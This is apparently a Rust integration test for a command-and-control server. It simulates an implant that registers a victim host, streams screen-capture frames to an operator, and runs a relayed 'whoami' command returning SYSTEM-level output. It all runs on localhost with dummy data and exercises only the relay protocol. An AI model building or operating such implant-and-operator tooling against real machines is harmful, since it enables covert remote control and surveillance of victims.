//! Binary-frame + command round-trip test against the real server binary.
//! Proves: screen frame (0x01 JPEG) relay, op->implant command relay,
//! cmd_result relay, and /api/sessions registration.

use std::io::{Read, Write};
use std::time::Duration;

use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::tungstenite::Message;

fn tiny_jpeg() -> Vec<u8> {
    let img = image::RgbImage::from_fn(8, 8, |x, y| {
        image::Rgb([(x * 30) as u8, (y * 30) as u8, 128])
    });
    let mut buf = std::io::Cursor::new(Vec::new());
    let mut enc = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut buf, 70);
    enc.encode(img.as_raw(), 8, 8, image::ExtendedColorType::Rgb8)
        .unwrap();
    buf.into_inner()
}

fn http_get(port: u16, path: &str) -> String {
    let mut s = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
    write!(s, "GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n").unwrap();
    let mut out = String::new();
    s.read_to_string(&mut out).unwrap();
    out
}

#[tokio::test]
async fn frame_and_command_relay() {
    let port: u16 = 8138;
    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_c2-server"))
        .current_dir(env!("CARGO_MANIFEST_DIR"))
        .env("BIND", format!("127.0.0.1:{port}"))
        .env("WEB_DIR", "web")
        .env_remove("C2_TOKEN")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("spawn server");
    tokio::time::sleep(Duration::from_millis(900)).await;

    let id = "frame-test-1";
    let (mut imp, _) =
        tokio_tungstenite::connect_async(format!("ws://127.0.0.1:{port}/ws/implant"))
            .await
            .expect("implant connect");
    imp.send(Message::Text(
        serde_json::json!({
            "t":"hello","id":id,"host":"FRAMEHOST","user":"u","os":"Windows 11",
            "arch":"x64","pid":9,"admin":false,"screen":[800,600]
        })
        .to_string(),
    ))
    .await
    .unwrap();
    tokio::time::sleep(Duration::from_millis(250)).await;

    // ---- sessions API registers us ----
    let body = http_get(port, "/api/sessions");
    assert!(body.contains("\"id\":\"frame-test-1\""), "sessions: {body}");
    assert!(body.contains("FRAMEHOST"), "sessions: {body}");

    let (mut op, _) =
        tokio_tungstenite::connect_async(format!("ws://127.0.0.1:{port}/ws/op/{id}"))
            .await
            .expect("op connect");
    tokio::time::sleep(Duration::from_millis(250)).await;

    // ---- screen binary frame survives intact ----
    let jpeg = tiny_jpeg();
    assert_eq!(&jpeg[..2], &[0xFF, 0xD8], "encoder sanity");
    let mut frame = vec![0x01u8];
    frame.extend_from_slice(&jpeg);
    imp.send(Message::Binary(frame)).await.unwrap();

    let got = tokio::time::timeout(Duration::from_secs(2), op.next())
        .await
        .expect("timeout frame")
        .expect("op closed")
        .unwrap();
    match got {
        Message::Binary(b) => {
            assert_eq!(b[0], 0x01, "frame tag");
            assert_eq!(&b[1..3], &[0xFF, 0xD8], "jpeg SOI");
            assert_eq!(b.len(), 1 + jpeg.len(), "frame length");
        }
        other => panic!("expected binary frame, got {other:?}"),
    }

    // ---- op -> implant command ----
    op.send(Message::Text(
        serde_json::json!({"t":"cmd","id":"c1","line":"whoami"}).to_string(),
    ))
    .await
    .unwrap();
    let got = tokio::time::timeout(Duration::from_secs(2), imp.next())
        .await
        .expect("timeout cmd")
        .expect("implant closed")
        .unwrap();
    match got {
        Message::Text(t) => assert!(t.contains("\"whoami\""), "got: {t}"),
        other => panic!("expected cmd text, got {other:?}"),
    }

    // ---- implant -> op command result ----
    imp.send(Message::Text(
        serde_json::json!({"t":"cmd_result","id":"c1","out":"nt authority\\system"}).to_string(),
    ))
    .await
    .unwrap();
    let got = tokio::time::timeout(Duration::from_secs(2), op.next())
        .await
        .expect("timeout result")
        .expect("op closed")
        .unwrap();
    match got {
        Message::Text(t) => assert!(t.contains("nt authority"), "got: {t}"),
        other => panic!("expected result text, got {other:?}"),
    }

    let _ = child.kill();
    let _ = child.wait();
}
